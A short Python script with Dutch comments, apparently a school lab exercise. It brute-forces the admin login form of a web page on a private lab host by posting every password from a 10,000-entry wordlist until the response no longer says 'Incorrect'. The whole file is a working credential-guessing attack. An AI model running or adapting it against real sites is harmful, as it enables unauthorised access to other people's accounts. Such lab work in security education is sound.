import requests
URL = "http://172.16.1.37:8888/super_login_query.php"

# Wat is het wachtwoord (Moet in lijst staan!)
fp = open(r"C:\Users\GEJE051205\Documents\programeren\6IICT_PROG4_oef\hfst_7_hacken\10000-password-seclist.txt", "r")
users = fp.readlines()
fp.close()

# Overloop alle opties.
for user in users:
    # Zet data klaar om te posten
    # Verzend POST request
    data = {"admin_id": "administratie", "password" : user[:-1], "super_login" : "submit"}
    response = requests.post(URL, data=data)

    # Controleer of login geslaagd is (OBV inhoud webpagina)
    if "Incorrect" in response.text:
        print(f"Incorrecte Combinatie. cheat_code:{user[:-1]}")
    else:
        print(f"Je bent binnen! cheat_code:{user[:-1]}")
        break